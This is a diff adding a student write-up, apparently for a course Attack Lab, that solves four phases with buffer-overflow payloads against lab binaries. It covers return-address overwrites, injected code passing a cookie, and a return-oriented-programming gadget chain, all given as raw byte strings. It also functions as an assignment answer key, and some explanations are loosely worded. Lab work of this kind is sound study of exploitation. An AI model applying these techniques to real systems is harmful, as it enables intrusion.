@@ -1,0 +1,89 @@
+Phase 1:
+Find the buffer, in our case it is 0x38 which is equivalent to 56 in decimal. 
+Next, we find the address of touch1, which is 0000000000402546.
+For our solution that we will be passing through hex2raw, we input our buffer of 56 bytes, indicated by 56 "00" followed by the address of touch 1
+form back to front resulting in 46 25 40 00 00 00 00 00.
+The answer is formated buffer -> touch1 since we want to execute touch1 after returning from getbuf function. 
+Running the ctarget with the resulting file from hex2raw completes phase 1.
+
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+46 25 40 00 00 00 00 00
+
+
+Phase 2:
+We want to pass our cookie as a parameter into touch2
+In order to accomplish this, create a file and compile the following assembly code, where $0x1d6f8fa5 is our cookie.
+
+mov $0x1d6f8fa5, %rdi
+retq
+
+This assembly moves our cookie into %rdi.
+The injected code sets the register to your cookie, and then uses a ret instruction to move to touch2
+By compiling this assembly file, we find the address of where our cookie is stored: 48 c7 c7 a5 8f 6f 1d c3
+Next we have to find where the string in touch2 is stored, and it is stored in the register rsp. 
+By doing x/s $rsp, we find our address of rsp is 0x55671620
+
+48 c7 c7 a5 8f 6f 1d c3
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+20 16 67 55 00 00 00 00
+76 25 40 00 00 00 00 00
+
+This answer is formated from our cookie at the top, our buffer, then the address of rsp and touch2.
+
+Phase 3:
+Add 0x48 to rsp. 0x48 is found by adding our buffer + rsp address bytes + touch3 bytes = 56 + 8 + 8
+This returns 0x55671668. Move 0x55671668 to rdi in the assembly code we write.
+Disassembling our assembly code provides us with the bytes associated with our mov. This is added to our solution file.
+Our solution is formated starting with the assembly bytes of 0x55671668, followed by our buffer, then the address of rsp, the touch 3 address, and the text value of our cookie.
+
+48 c7 c7 68 16 67 55 c3
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+20 16 67 55 00 00 00 00
+8b 26 40 00 00 00 00 00
+31 64 36 66 38 66 61 35
+
+Phase 4: 
+Since the address of the stack changes each execution, it makes it difficult to see where our code will be located.
+The commands we will be using will be popping our cookie from the stack, then moving the cooking into %rdi.
+
+popq %rax
+movq %rax %rdi
+ret 
+
+First we have to reference the table in the pdf to see what the value of pop %rax is. In our case, pop %rax is 58. Within our asm file for rtarget, we look for the value
+58 followed by c3 within start_farm and end_farm. After we find the location, we take the address and add the offset of 58, which is 5 bytes. 
+This is represented by adding 0x5 to 0x402760, the address at which we found 58 c3. This is gadget 1. 
+
+Next we have to find our 2nd gadget, which happens to be movq %rax %rdi. This is found by identifying 48 89 c7 c3 within the assembly code between start_farm and end_farm.
+The address this is located at is 0x402736, and since 48 is found at an offset of 2, we do 0x402736 + 0x2, yeilding 0x402738. This is gadget 2.
+Finally, we format our answer. 
+We begin with our buffer, followed by gadget 1, the value of our cookie, gadget 2 and the address of touch2, which is easily found in the asm. 
+This leaves us with the answer:
+
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+65 27 40 00 00 00 00 00
+a5 8f 6f 1d 00 00 00 00
+38 27 40 00 00 00 00 00
+76 25 40 00 00 00 00 00
